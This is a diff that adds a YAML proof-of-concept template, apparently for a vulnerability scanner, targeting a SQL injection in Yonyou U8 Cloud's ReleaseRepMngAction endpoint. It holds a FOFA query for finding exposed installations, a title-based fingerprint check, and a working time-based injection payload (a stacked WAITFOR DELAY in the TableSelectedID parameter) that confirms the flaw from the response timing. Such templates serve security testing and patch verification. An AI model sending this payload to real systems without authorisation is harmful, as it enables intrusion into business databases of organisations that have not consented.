@@ -1,0 +1,20 @@
+id: poc-yaml-yongyou-u8-cloud-releaserepmngaction-sqli
+info:
+  name: 用友U8 Cloud ReleaseRepMngAction SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8cloud
+  fofa: app="用友-U8-Cloud"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(title,"U8C")
+- method: GET
+  path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.ReleaseRepMngAction&method=updateDelFlag&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:{{.t1}}%27--
+  expression: status_code == 200 && contains(body,"正在执行") && contains(body,"iUFO")
+    && duration > t1 && duration < t2
+transport: http
